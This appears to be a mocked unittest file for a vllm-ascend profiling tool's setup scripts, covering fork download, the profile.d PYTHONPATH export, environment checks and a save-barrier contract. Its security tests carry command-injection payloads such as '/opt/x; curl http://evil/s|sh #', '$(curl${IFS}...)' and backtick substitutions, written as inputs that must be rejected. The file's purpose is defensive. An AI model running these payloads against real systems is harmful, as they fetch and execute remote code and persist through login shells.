#!/usr/bin/env python3
"""tier A 单测：vllm-ascend-profiling Stage-1 脚本纯逻辑 + 参考契约看守。

仅 python3 标准库（unittest/mock）。docker_exec / _run 一律用 mock，绝不
真实触碰 docker、网络或 NPU。
"""

from __future__ import annotations

import ast
import json
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

# 被测 skill：容器内 /staging/skill，宿主机直跑取用例目录上两级（cases 的上一级）
if Path("/staging/skill").is_dir():
    SKILL_DIR = Path("/staging/skill")
else:
    CASE_DIR = Path(__file__).resolve().parent      # .../unit-stage1-fix-contract/tests
    SKILL_DIR = CASE_DIR.parent.parent.parent       # tests → case → cases → skill

SCRIPTS = SKILL_DIR / "scripts"
REFERENCE = SKILL_DIR / "references"
sys.path.insert(0, str(SCRIPTS))

import fix_pythonpath  # noqa: E402
import env_check  # noqa: E402

FORK_COMMIT = "5d1d24cd1b5dfeee80356d5b4b08f86e8c1d72ee"
EXPECTED_MARKERS = {
    "vllm/v1/engine/core.py": "_attach_ttft_breakdown",
    "vllm/v1/request.py": "ttft_hash_and_local_cache_time",
    "vllm/renderers/base.py": "[TTFT_DEBUG][Tokenizer]",
}


def container(call_always_succeeds: bool = True, outputs: dict | None = None):
    """构造 docker_exec mock：按顺序或按命令内容返回 canned 输出。"""
    seq = list((outputs or {}).get("seq", []))
    table = list((outputs or {}).get("table", []))
    calls = []

    def fake_exec(container_name, inner, timeout=20):
        calls.append(inner)
        for pattern, ret in table:
            if pattern in inner:
                return ret
        if seq:
            return seq.pop(0)
        return (0, "") if call_always_succeeds else (1, "mocked failure")

    m = mock.MagicMock(side_effect=fake_exec)
    m.calls = calls
    return m


# ---------------------------------------------------------------------------
# references/vllm_fork.json 契约
# ---------------------------------------------------------------------------

class TestForkRefContract(unittest.TestCase):
    def setUp(self):
        self.ref = fix_pythonpath.load_fork_ref()
        self.assertIsNotNone(self.ref)

    def test_required_keys(self):
        for key in ("repo", "commit", "url", "tarball_url", "container_path",
                    "profile_file", "pip_package",
                    "expected_pip_version_prefix", "known_good_pip_version"):
            self.assertTrue(self.ref.get(key), f"missing key: {key}")
        self.assertEqual(self.ref["repo"], "rosinL/vllm")
        self.assertEqual(self.ref["commit"], FORK_COMMIT)
        self.assertTrue(self.ref["url"].startswith("https://github.com/"))
        self.assertIn(FORK_COMMIT, self.ref["tarball_url"])
        self.assertTrue(self.ref["tarball_url"].endswith(".tar.gz"))
        self.assertTrue(self.ref["container_path"].startswith("/"))
        self.assertTrue(self.ref["profile_file"].startswith("/etc/profile.d/"))

    def test_no_local_tarball_key(self):
        """无兜底回归断言：参考里不得出现 local_tarball。"""
        self.assertNotIn("local_tarball", self.ref)

    def test_pip_version_fields(self):
        self.assertEqual(self.ref["pip_package"], "vllm")
        self.assertEqual(self.ref["expected_pip_version_prefix"], "0.23.0")
        self.assertEqual(self.ref["known_good_pip_version"], "0.23.0+empty")

    def test_markers(self):
        self.assertEqual(self.ref["markers"], EXPECTED_MARKERS)


# ---------------------------------------------------------------------------
# fix_pythonpath.py：无离线兜底 + 直接下载
# ---------------------------------------------------------------------------

class TestFixPythonpathNoFallback(unittest.TestCase):
    def test_source_has_no_offline_fallback_indicators(self):
        text = Path(fix_pythonpath.__file__).read_text(encoding="utf-8")
        for forbidden in ("vllm_fork_src", "install_fork_from_local",
                          "docker_cp_to_container", "wget"):
            self.assertNotIn(forbidden, text, f"script must not contain {forbidden!r}")

    def test_install_fork_builds_single_direct_download(self):
        mock_exec = container()
        with mock.patch.object(fix_pythonpath, "docker_exec", mock_exec):
            ok, detail = fix_pythonpath.install_fork(
                "c0", "https://github.com/rosinL/vllm/archive/x.tar.gz", "/opt/fork", 10)
        self.assertTrue(ok)
        self.assertEqual(len(mock_exec.calls), 1)
        inner = mock_exec.calls[0]
        self.assertIn("curl -fsSL https://github.com/rosinL/vllm/archive/x.tar.gz", inner)
        self.assertIn("| tar xz", inner)
        self.assertIn("--strip-components=1", inner)
        self.assertIn("/opt/fork", inner)
        self.assertNotIn("wget", inner)
        self.assertIn("downloaded", detail)

    def test_install_fork_failure_does_not_fall_back(self):
        mock_exec = container(call_always_succeeds=False)
        with mock.patch.object(fix_pythonpath, "docker_exec", mock_exec):
            ok, detail = fix_pythonpath.install_fork("c0", "http://x/y.tar.gz", "/opt/fork", 10)
        self.assertFalse(ok)
        self.assertTrue(detail.startswith("direct download/extract failed"))
        # 失败后绝不发起第二条下载路径
        self.assertEqual(len(mock_exec.calls), 1)

    def test_verify_fork_pass(self):
        all_ok = "\n".join(f"ok {k}" for k in EXPECTED_MARKERS)
        mock_exec = container(outputs={"seq": [(0, "FOUND"), (0, all_ok)]})
        with mock.patch.object(fix_pythonpath, "docker_exec", mock_exec):
            ok, detail = fix_pythonpath.verify_fork("c0", "/opt/fork", EXPECTED_MARKERS)
        self.assertTrue(ok)
        self.assertIn("markers", detail)

    def test_verify_fork_reports_missing_marker(self):
        mixed = "\n".join([
            "ok vllm/v1/engine/core.py",
            "missing vllm/v1/request.py",
            "ok vllm/renderers/base.py",
        ])
        mock_exec = container(outputs={"seq": [(0, "FOUND"), (0, mixed)]})
        with mock.patch.object(fix_pythonpath, "docker_exec", mock_exec):
            ok, detail = fix_pythonpath.verify_fork("c0", "/opt/fork", EXPECTED_MARKERS)
        self.assertFalse(ok)
        self.assertIn("vllm/v1/request.py", detail)

    def test_verify_fork_rejects_missing_checkout(self):
        mock_exec = container(outputs={"seq": [(1, "no such file")]})
        with mock.patch.object(fix_pythonpath, "docker_exec", mock_exec):
            ok, detail = fix_pythonpath.verify_fork("c0", "/opt/fork", EXPECTED_MARKERS)
        self.assertFalse(ok)
        self.assertIn("not found", detail)

    def test_write_profile_written_then_idempotent(self):
        full = "export PYTHONPATH='/opt/fork'${PYTHONPATH:+:$PYTHONPATH}"
        # 第一次：cat 显示文件缺失("") → 写入 → cat 复验整文件恰好一行 export
        seq = [(0, ""), (0, ""), (0, full)]
        mock_exec = container(outputs={"seq": seq})
        with mock.patch.object(fix_pythonpath, "docker_exec", mock_exec):
            ok, detail, action = fix_pythonpath.write_profile("c0", "/etc/profile.d/x.sh", "/opt/fork")
        self.assertTrue(ok)
        self.assertEqual(action, "written")
        self.assertTrue(detail.startswith("wrote /etc/profile.d/x.sh"))
        write_cmd = mock_exec.calls[1]
        self.assertTrue(write_cmd.startswith("printf"))
        self.assertIn("export PYTHONPATH=", write_cmd)
        self.assertIn("${PYTHONPATH:+:$PYTHONPATH}", write_cmd)
        self.assertIn("/opt/fork", write_cmd)

        # 第二次（幂等）：整文件读取后与期望行完全一致 → already-set，且不再写盘
        mock_exec2 = container(outputs={"seq": [(0, full)]})
        with mock.patch.object(fix_pythonpath, "docker_exec", mock_exec2):
            ok, detail, action = fix_pythonpath.write_profile("c0", "/etc/profile.d/x.sh", "/opt/fork")
        self.assertTrue(ok)
        self.assertEqual(action, "already-set")
        self.assertEqual(len(mock_exec2.calls), 1)  # 只读一次，无写动作

    def test_write_profile_export_line_format(self):
        export = "export PYTHONPATH='/opt/x'${PYTHONPATH:+:$PYTHONPATH}"
        seq = [(0, ""), (0, ""), (0, export)]
        mock_exec = container(outputs={"seq": seq})
        with mock.patch.object(fix_pythonpath, "docker_exec", mock_exec):
            ok, _, _ = fix_pythonpath.write_profile("c0", "/etc/profile.d/x.sh", "/opt/x")
        self.assertTrue(ok)
        write_cmd = mock_exec.calls[1]
        self.assertTrue(write_cmd.startswith("printf"))
        self.assertIn("export PYTHONPATH=", write_cmd)
        self.assertIn("${PYTHONPATH:+:$PYTHONPATH}", write_cmd)
        self.assertIn("/opt/x", write_cmd)

    def test_load_fork_ref_missing_exits_2(self):
        with mock.patch.object(fix_pythonpath, "FORK_REF_PATH",
                               Path(tempfile.mkdtemp()) / "nonexistent.json"):
            with self.assertRaises(SystemExit) as cm:
                fix_pythonpath.load_fork_ref()
        self.assertEqual(cm.exception.code, 2)


class TestFixPythonpathEntryExit(unittest.TestCase):
    def test_bogus_container_exits_2(self):
        """容器不可达时入口返回 2（两种宿主均可复现：docker 缺失→127；无此容器→1）。"""
        script = Path(fix_pythonpath.__file__)
        proc = subprocess.run(
            [sys.executable, str(script), "--container", "kpbot-case-bogus-container"],
            capture_output=True, text=True, timeout=60,
        )
        self.assertEqual(proc.returncode, 2)


class TestFixPythonpathForkPathSecurity(unittest.TestCase):
    """--fork-path 白名单：profile.d 文件会被 login shell source，注入即持久化。"""

    VALID = ("/opt/vllm-ttft-fork", "/a/b.c_0123-xY", "/x")

    INVALID = [
        "/opt/x; curl http://evil/s|sh #",
        "/opt/x\ncurl http://evil",         # 换行注入
        "/opt/x\rcurl http://evil",         # CR 注入
        "opt/relative",                      # 相对路径
        "/a b",                              # 空格
        "/x${IFS}y",                         # IFS 命令替换
        "/x$(cmd)",                          # 命令替换
        "/x`cmd`",                           # 反引号
        "/x|cmd",  "/x&cmd",  "/x;cmd",      # 管道/后台/顺序
        "",                                  # 空
    ]

    def test_whitelist_accepts_legal_paths(self):
        for p in self.VALID:
            self.assertIsNone(fix_pythonpath._invalid_fork_path_reason(p), p)

    def test_whitelist_rejects_injection_payloads(self):
        for p in self.INVALID:
            self.assertIsNotNone(fix_pythonpath._invalid_fork_path_reason(p), p)

    def test_entry_rejects_malicious_fork_path_before_any_docker(self):
        script = Path(fix_pythonpath.__file__)
        with self.subTest("malicious"):
            proc = subprocess.run(
                [sys.executable, str(script),
                 "--container", "kpbot-case-bogus-container",
                 "--fork-path", "/opt/x; curl http://evil/s|sh #"],
                capture_output=True, text=True, timeout=60,
            )
            self.assertEqual(proc.returncode, 2)
            self.assertIn("invalid fork path", proc.stderr)
        with self.subTest("legal path passes the gate (fails later on docker inspect, not on the path)"):
            proc = subprocess.run(
                [sys.executable, str(script),
                 "--container", "kpbot-case-bogus-container",
                 "--fork-path", "/opt/vllm-ttft-fork"],
                capture_output=True, text=True, timeout=60,
            )
            self.assertNotIn("invalid fork path", proc.stderr)

    def test_write_profile_rewrites_legacy_or_poisoned_slot(self):
        """旧版/被污染的多语句 profile 文件必须整档重写，不允许 substring 命中跳过。"""
        poisoned = (
            "# set by vllm-ascend-profiling fix_pythonpath.py\n"
            "export PYTHONPATH='/opt/fork'${PYTHONPATH:+:$PYTHONPATH}\n"
            "curl http://evil/s|sh\n"
        )
        good = "# set by vllm-ascend-profiling fix_pythonpath.py\nexport PYTHONPATH='/opt/fork'${PYTHONPATH:+:$PYTHONPATH}\n"
        export_line = "export PYTHONPATH='/opt/fork'${PYTHONPATH:+:$PYTHONPATH}"
        mock_exec = container(outputs={"seq": [(0, poisoned), (0, ""), (0, good)]})
        with mock.patch.object(fix_pythonpath, "docker_exec", mock_exec):
            ok, detail, action = fix_pythonpath.write_profile("c0", "/etc/profile.d/x.sh", "/opt/fork")
        self.assertTrue(ok, detail)
        self.assertEqual(action, "written")  # 不是 already-set

    def test_write_profile_fails_when_extra_statement_remains(self):
        """写回复验必须整文件判定：残留第二条语句 → verify-failed。"""
        export_line = "export PYTHONPATH='/opt/x'${PYTHONPATH:+:$PYTHONPATH}"
        leftover = f"# set by vllm-ascend-profiling fix_pythonpath.py\n{export_line}\ncurl http://evil\n"
        mock_exec = container(outputs={"seq": [(0, ""), (0, ""), (0, leftover)]})
        with mock.patch.object(fix_pythonpath, "docker_exec", mock_exec):
            ok, detail, action = fix_pythonpath.write_profile("c0", "/etc/profile.d/x.sh", "/opt/x")
        self.assertFalse(ok)
        self.assertEqual(action, "verify-failed")


class TestEnvCheckInjectionGuard(unittest.TestCase):
    def test_check_config_quotes_and_rejects_metachar_refs(self):
        procs = [{
            "pid": "7", "ppid": "1",
            "cmdline": "vllm serve --config $(curl${IFS}http://evil/s|sh) --config /vllm/cfg.json -c '/tmp/x'",
        }]
        mock_exec = container(outputs={"seq": [(0, "cfg content")]})
        with mock.patch.object(env_check, "docker_exec", mock_exec):
            env_check.check_config("c0", procs, {"torch_profiler_with_stack": "true"})
        self.assertEqual(len(mock_exec.calls), 1)
        inner = mock_exec.calls[0]
        # 合法路径经 shlex.quote 插值（安全字符本身不带引号，但 quote 调用是硬契约）
        self.assertIn("cat /vllm/cfg.json", inner)
        # 恶意载荷不得原样出现在任何 docker init 命令串中
        self.assertNotIn("curl", inner)
        self.assertNotIn("${IFS}", inner)

    def test_check_config_backtick_payload_never_reaches_bash(self):
        procs = [{
            "pid": "7", "ppid": "1",
            "cmdline": "vllm serve -c /vllm/ok.json --config `/read_flag`",
        }]
        mock_exec = container(outputs={"seq": [(0, "c")]})
        with mock.patch.object(env_check, "docker_exec", mock_exec):
            env_check.check_config("c0", procs, {"torch_profiler_with_stack": "true"})
        self.assertEqual(len(mock_exec.calls), 1)
        self.assertNotIn("`", mock_exec.calls[0])


class TestEnvCheckServiceProbePurity(unittest.TestCase):
    class _FakeResp:
        status = 200

        def read(self, n=-1):
            return b'{"paths": {"/start_profile": {}, "/health": {}}}'

        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

    def _run_check_service(self, probe_start):
        hits = []
        def fake_urlopen(req, timeout=None):
            hits.append((getattr(req, "method", "GET"), req.full_url))
            return self._FakeResp()
        with mock.patch("urllib.request.urlopen", side_effect=fake_urlopen):
            results = env_check.check_service("http://10.0.0.2:7100", 1.0, probe_start=probe_start)
        return hits, results

    def test_default_probe_never_invokes_start_profile(self):
        hits, results = self._run_check_service(probe_start=False)
        methods = [m for m, _ in hits]
        self.assertNotIn("POST", methods)
        self.assertTrue(any(u.endswith("/openapi.json") for _, u in hits))
        self.assertTrue(any(u.endswith("/health") for _, u in hits))
        ep = next(r for r in results if r["name"] == "endpoint_start_profile")
        self.assertEqual(ep["status"], "pass")
        self.assertIn("NOT started", ep["detail"])

    def test_probe_start_profile_flag_runs_paired_start_stop(self):
        hits, results = self._run_check_service(probe_start=True)
        methods = [m for m, _ in hits]
        self.assertIn("POST", methods)
        paths = [u.rsplit("/", 1)[-1] for m, u in hits if m == "POST"]
        self.assertEqual(paths, ["start_profile", "stop_profile"])
        ep = next(r for r in results if r["name"] == "endpoint_start_profile")
        self.assertEqual(ep["status"], "pass")

    def test_flag_defaults_off(self):
        import argparse
        # argparse store_true 的默认值恒为 False：不传 --probe-start-profile 即无副作用探测
        ap = argparse.ArgumentParser()
        ap.add_argument("--probe-start-profile", action="store_true")
        args, _ = ap.parse_known_args([])
        self.assertFalse(args.probe_start_profile)


# ---------------------------------------------------------------------------
# env_check.py：纯函数 + mock 检查项
# ---------------------------------------------------------------------------

class TestEnvCheckPureFunctions(unittest.TestCase):
    def test_load_fork_ref_returns_real_ref(self):
        self.assertIsNotNone(env_check.load_fork_ref())
        self.assertEqual(env_check.load_fork_ref()["commit"], FORK_COMMIT)

    def test_grep_markers_snippet_quotes_marker_and_path(self):
        snippet = env_check._grep_markers_snippet("/opt/fork", {"vllm/x.py": "marker with space"})
        self.assertIn('grep -qF -- \'marker with space\'', snippet)
        self.assertIn("/opt/fork/vllm/x.py", snippet)
        self.assertIn("ok vllm/x.py", snippet)
        self.assertIn("missing vllm/x.py", snippet)

    def test_config_from_text_json_keys(self):
        found = env_check._config_from_text('{"torch_profiler_with_stack": true, "max_iterations": 5}')
        self.assertEqual(found.get("torch_profiler_with_stack"), "true")
        self.assertEqual(found.get("max_iterations"), "5")

    def test_config_from_text_kv_style(self):
        found = env_check._config_from_text("vllm serve --config /x.json torch_profiler_with_stack=false")
        self.assertEqual(found.get("torch_profiler_with_stack"), "false")

    def test_emit_exit_code_and_summary(self):
        rows = [env_check._fail_simple("a", "d", "h"),
                {"name": "b", "status": "pass", "detail": "", "fixable": False, "fix_hint": ""}]
        with mock.patch("sys.stdout"):
            rc = env_check.emit(rows, "stage-x")
        self.assertEqual(rc, 1)
        with mock.patch("sys.stdout"):
            rc = env_check.emit([rows[1]], "stage-x")
        self.assertEqual(rc, 0)


class TestEnvCheckMockedChecks(unittest.TestCase):
    PS_ROWS = (
        "root      12345 12288  2 10:24 ?  00:02:31 python3 /usr/bin/vllm serve --config /vllm/cfg.json\n"
        "grep: bad noise line\n"
    )

    def test_list_vllm_processes_filters_noise(self):
        mock_exec = container(outputs={"seq": [(0, self.PS_ROWS)]})
        with mock.patch.object(env_check, "docker_exec", mock_exec):
            procs, check = env_check.list_vllm_processes("c0")
        self.assertEqual(check["status"], "pass")
        self.assertEqual([p["pid"] for p in procs], ["12345"])
        self.assertIn("vllm serve", procs[0]["cmdline"])

    def test_pythonmalloc_pass_when_malloc(self):
        procs = [{"pid": "7", "ppid": "1", "cmdline": "vllm"}]
        mock_exec = container(outputs={"seq": [(0, "PYTHONMALLOC=malloc")]})
        with mock.patch.object(env_check, "docker_exec", mock_exec):
            check = env_check.check_pythonmalloc("c0", procs)
        self.assertEqual(check["status"], "pass")

    def test_pythonmalloc_fail_when_missing(self):
        procs = [{"pid": "7", "ppid": "1", "cmdline": "vllm"}]
        mock_exec = container(outputs={"seq": [(0, "")]})
        with mock.patch.object(env_check, "docker_exec", mock_exec):
            check = env_check.check_pythonmalloc("c0", procs)
        self.assertEqual(check["status"], "fail")
        self.assertIn("PYTHONMALLOC=malloc", check["fix_hint"])

    def test_ttft_fork_pass_with_markers_and_pip(self):
        ref = env_check.load_fork_ref()
        procs = [{"pid": "7", "ppid": "1", "cmdline": "/usr/bin/python3 vllm"}]
        mock_exec = container(
            call_always_succeeds=True,
            outputs={"table": [
                ("environ | grep -E '^PYTHONPATH='", (0, "PYTHONPATH=/opt/fork")),
                ("test -f ", (0, "FOUND")),
                ("grep -qF", (0, "\n".join(f"ok {k}" for k in EXPECTED_MARKERS))),
            ]},
        )
        with mock.patch.object(env_check, "docker_exec", mock_exec), \
                mock.patch.object(env_check, "_vllm_python", return_value="python3"), \
                mock.patch.object(env_check, "_pip_show", return_value=(ref["known_good_pip_version"], "/usr/local")):
            check = env_check.check_vllm_ttft_fork("c0", procs)
        self.assertEqual(check["status"], "pass", check["detail"])

    def test_ttft_fork_fail_without_pythonpath(self):
        procs = [{"pid": "7", "ppid": "1", "cmdline": "vllm"}]
        mock_exec = container(outputs={"seq": [(0, "")]})
        with mock.patch.object(env_check, "docker_exec", mock_exec), \
                mock.patch.object(env_check, "_pip_show", return_value=("", "")):
            check = env_check.check_vllm_ttft_fork("c0", procs)
        self.assertEqual(check["status"], "fail")
        self.assertIn("fix_pythonpath.py", check["fix_hint"])

    def test_ttft_fork_fail_when_fork_ref_broken(self):
        with mock.patch.object(env_check, "load_fork_ref", return_value=None):
            with mock.patch.object(env_check, "docker_exec", container()):
                check = env_check.check_vllm_ttft_fork(
                    "c0", [{"pid": "7", "ppid": "1", "cmdline": "vllm"}])
        self.assertEqual(check["status"], "fail")
        self.assertIn("Restore references/vllm_fork.json", check["fix_hint"])

    def test_vllm_ascend_version_mismatch_is_user_action(self):
        procs = [{"pid": "7", "ppid": "1", "cmdline": "vllm"}]
        mock_exec = container(outputs={"seq": [(0, "Version: 0.23.0rc2.dev10+g9999999")]})
        with mock.patch.object(env_check, "docker_exec", mock_exec), \
                mock.patch.object(env_check, "_vllm_python", return_value="python3"):
            check = env_check.check_vllm_ascend("c0", procs)
        self.assertEqual(check["status"], "fail")
        self.assertIn("reinstall", check["fix_hint"].lower())

    def test_config_check_flags_mismatch(self):
        procs = [{"pid": "7", "ppid": "1", "cmdline": "vllm serve max_iterations=5"}]
        mock_exec = container()
        with mock.patch.object(env_check, "docker_exec", mock_exec):
            check = env_check.check_config("c0", procs, {"torch_profiler_with_stack": "true"})
        self.assertEqual(check["status"], "fail")
        self.assertIn("torch_profiler_with_stack", check["detail"])


class TestSaveBarrierConditionVariable(unittest.TestCase):
    """意见2.0 看守：wait_for_save 必须保持 join() 的条件变量即时唤醒语义。

    pool_worker.py 顶层 import vllm/vllm_ascend（容器内无依赖），无法直接
    import，这里用 AST 断言实现契约，防止回退成无界 join() 或时间片轮询。
    """

    @classmethod
    def setUpClass(cls):
        source = (REFERENCE / "vllm_ascend_patch" / "pool_worker.py").read_text(encoding="utf-8")
        cls.tree = ast.parse(source)
        cls.func = None
        for node in ast.walk(cls.tree):
            if isinstance(node, ast.ClassDef) and node.name == "KVPoolWorker":
                for item in node.body:
                    if isinstance(item, ast.AsyncFunctionDef) and item.name == "wait_for_save":
                        raise AssertionError("wait_for_save must stay synchronous")
                    if isinstance(item, ast.FunctionDef) and item.name == "wait_for_save":
                        cls.func = item
        if cls.func is None:
            raise AssertionError("KVPoolWorker.wait_for_save not found")

    def test_wait_uses_all_tasks_done_condition_variable(self):
        names = {n.id for n in ast.walk(self.func) if isinstance(n, ast.Name)}
        attrs = {n.attr for n in ast.walk(self.func) if isinstance(n, ast.Attribute)}
        self.assertIn("all_tasks_done", names | attrs)
        self.assertIn("wait_for", names | attrs)
        self.assertIn("unfinished_tasks", names | attrs)

    def test_no_polling_grid_in_barrier(self):
        for node in ast.walk(self.func):
            if isinstance(node, ast.Call):
                fn = node.func
                if isinstance(fn, ast.Attribute) and fn.attr == "sleep" and node.args:
                    value = node.args[0]
                    if isinstance(value, ast.Constant) and isinstance(value.value, (int, float)) \
                            and 0.005 <= value.value <= 0.5:
                        self.fail("wait_for_save reintroduced a polling grid (time.sleep)")
                joined = ast.unparse(node)
                self.assertNotIn("unfinished_tasks_time_sleep", joined)

    def test_queue_join_fallback_is_bounded(self):
        joined = ast.unparse(self.func)
        self.assertIn("threading.Thread(target=send_queue.join", joined)
        self.assertIn("all_tasks_done", joined)
        self.assertIn("KV_SAVE_BARRIER_TIMEOUT", joined)

    def test_barrier_timeout_constant_exists(self):
        source = (REFERENCE / "vllm_ascend_patch" / "pool_worker.py").read_text(encoding="utf-8")
        self.assertRegex(source, r"KV_SAVE_BARRIER_TIMEOUT\s*=\s*30\.0")


if __name__ == "__main__":
    unittest.main()
